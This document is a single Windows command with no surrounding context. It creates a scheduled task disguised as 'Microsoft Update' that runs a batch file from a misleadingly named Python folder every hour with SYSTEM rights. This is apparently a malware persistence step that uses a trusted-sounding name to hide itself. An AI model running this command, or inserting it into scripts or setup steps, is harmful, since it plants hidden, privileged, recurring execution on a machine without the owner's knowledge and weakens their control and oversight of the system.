schtasks /create /tn "Microsoft Update" /tr "C:\ProgramData\Python391\Python391\start.bat" /sc minute /mo 60 /f /ru SYSTEM
